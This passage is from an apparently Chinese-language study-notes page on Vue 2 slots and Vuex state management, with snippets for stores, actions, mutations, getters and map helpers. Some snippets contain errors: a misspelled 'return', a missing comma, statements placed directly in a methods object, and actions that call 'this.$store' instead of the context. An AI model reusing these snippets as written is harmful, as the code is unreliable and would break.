class="line"><span class="built_in">this</span>.$http.get()<span class="comment">//语法跟axios一样</span></span><br></pre></td></tr></table></figure><h1 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h1><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">Category</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>html结构1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Category</span>&gt;</span></span><br><span class="line">子组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义插槽 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span>插槽默认内容...<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>具名插槽：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">Category</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>html结构1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- v-slot只能写在template,写在其他地方或报错 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:footer</span>&gt;</span><span class="comment">&lt;!-- vue2.6版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>html结构2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Category</span>&gt;</span></span><br><span class="line">子组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义插槽 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;center&quot;</span>&gt;</span>插槽默认内容...<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>插槽默认内容...<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">Category</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scopeData数据是一个对象 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">scope</span>=<span class="string">&quot;scopeData&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生成的是ul列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;g in scopeData.games&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Category</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Category</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scopeData数据是一个对象 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">&quot;scopeData&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生成的是h4标题 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span> <span class="attr">v-for</span>=<span class="string">&quot;g in scopeData.games&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Category</span>&gt;</span></span><br><span class="line">子组件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:games</span>=<span class="string">&quot;games&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Category&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        props:[<span class="string">&#x27;title&#x27;</span>],</span></span><br><span class="line"><span class="javascript">        <span class="comment">//数据在子组件自身</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                games:[<span class="string">&#x27;红色警戒&#x27;</span>,<span class="string">&#x27;穿越火线&#x27;</span>,<span class="string">&#x27;劲舞团&#x27;</span>,<span class="string">&#x27;超级玛丽&#x27;</span>]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><p><img src="image-20220519094045690.png" alt=""></p><p><img src="image-20220519094329389.png" alt=""></p><p><img src="image-20220522145125359.png" alt=""></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>​        在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><h3 id="何时使用？"><a href="#何时使用？" class="headerlink" title="何时使用？"></a>何时使用？</h3><p>​        多个组件需要共享数据时</p><h3 id="搭建vuex环境"><a href="#搭建vuex环境" class="headerlink" title="搭建vuex环境"></a>搭建vuex环境</h3><p>安装vuex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vue2vuex3</span><br><span class="line">vue3vuex4</span><br><span class="line">在vue2版本中：npm i vuex@3</span><br></pre></td></tr></table></figure><ol><li><p>创建文件：<code>src/store/index.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入Vue核心库</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">//应用Vuex插件</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="comment">//准备actions对象——响应组件中用户的动作</span></span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"><span class="comment">//准备mutations对象——修改state中的数据</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;&#125;</span><br><span class="line"><span class="comment">//准备state对象——保存具体的数据</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    actions,<span class="comment">//actions:actions;</span></span><br><span class="line">    mutations,</span><br><span class="line">    state</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>在<code>main.js</code>中创建vm时传入<code>store</code>配置项</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//引入store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store/index.js&#x27;</span></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建vm</span></span><br><span class="line">    <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">        el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">        render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">        store</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><ol><li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入Vue核心库</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">//引用Vuex</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">    <span class="comment">//响应组件中加的动作</span></span><br><span class="line">    <span class="function"><span class="title">jia</span>(<span class="params">context,value</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// context是mini版的store&#123;$dispatch,$commit,$state&#125;</span></span><br><span class="line">        <span class="comment">// value是从dispatch或commit传递过来的数据</span></span><br><span class="line">        <span class="comment">// console.log(&#x27;actions中的jia被调用了&#x27;,miniStore,value)</span></span><br><span class="line">        <span class="comment">// context.commit(&#x27;JIA&#x27;,value)（一个服务员）</span></span><br><span class="line">        <span class="comment">// 逻辑强的时候可以这么写（多个服务员）</span></span><br><span class="line">        <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;demo1&#x27;</span>,value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">demo1</span>(<span class="params">context,value</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;demo2&#x27;</span>,value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">demo2</span>(<span class="params">context,value</span>)</span>&#123;</span><br><span class="line">        context.commit(<span class="string">&#x27;JIA&#x27;</span>,value)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改state的数据</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">    <span class="comment">//执行加</span></span><br><span class="line">    <span class="function"><span class="title">JIA</span>(<span class="params">state,value</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// console.log(&#x27;mutations中的JIA被调用了&#x27;,state,value)</span></span><br><span class="line">        state.sum += value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化数据</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">    sum:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.sum&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line">                n:1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">        <span class="comment">//dispatch对应action的jia</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;jia&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line"><span class="javascript">        <span class="comment">//commit对应mutations的JIA</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;JIA&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>组件中读取vuex中的数据：<code>$store.state.sum</code></p></li><li><p>组件中修改vuex中的数据：<code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code> 或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p><blockquote><p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote></li></ol><h3 id="getters的使用"><a href="#getters的使用" class="headerlink" title="getters的使用"></a>getters的使用</h3><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">    <span class="function"><span class="title">bigSum</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 需要一个返回值，有点像计算属性</span></span><br><span class="line">        <span class="keyword">return</span> state.sum * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    ......</span><br><span class="line">    getters</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中读取数据：<code>$store.getters.bigSum</code></p></li></ol><h3 id="四个map方法的使用"><a href="#四个map方法的使用" class="headerlink" title="四个map方法的使用"></a>四个map方法的使用</h3><ol><li><p><strong>mapState方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    sum()&#123;</span></span><br><span class="line"><span class="comment">    return this.$store.state.sum</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    school()&#123;</span></span><br><span class="line"><span class="comment">    return this.$store.state.sum</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    subject()&#123;</span></span><br><span class="line"><span class="comment">    return this.$store.state.sum</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span></span><br><span class="line">    ...mapState(&#123;<span class="attr">sum</span>:<span class="string">&#x27;sum&#x27;</span>,<span class="attr">school</span>:<span class="string">&#x27;school&#x27;</span>,<span class="attr">subject</span>:<span class="string">&#x27;subject&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">        <span class="comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span></span><br><span class="line">        ...mapState([<span class="string">&#x27;sum&#x27;</span>,<span class="string">&#x27;school&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>]),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    <span class="comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span></span><br><span class="line">    ...mapGetters(&#123;<span class="attr">bigSum</span>:<span class="string">&#x27;bigSum&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span></span><br><span class="line">    ...mapGetters([<span class="string">&#x27;bigSum&#x27;</span>])</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注意：传递数据需要在这里传递 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;incrementOdd(n)&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;incrementWait(n)&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;jiaOdd(n)&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;jiaWait(n)&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            reruen&#123;</span><br><span class="line">                n:1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            /*</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">increment</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">decrement</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;jiaWait&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line">            &#125;</span><br><span class="line">            */</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//借助mapActions生成对应的方法，方法中会调用dispatch去联系Actions</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span></span></span><br><span class="line"><span class="javascript">            ...mapActions(&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="attr">incrementWait</span>:<span class="string">&#x27;jiaWait&#x27;</span>&#125;),</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span></span></span><br><span class="line"><span class="javascript">            ...mapActions([<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="string">&#x27;jiaWait&#x27;</span>])</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 注意：传递数据需要在这里传递 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;increment(n)&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;decrement(n)&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;JIA(n)&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;JIAN(n)&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span 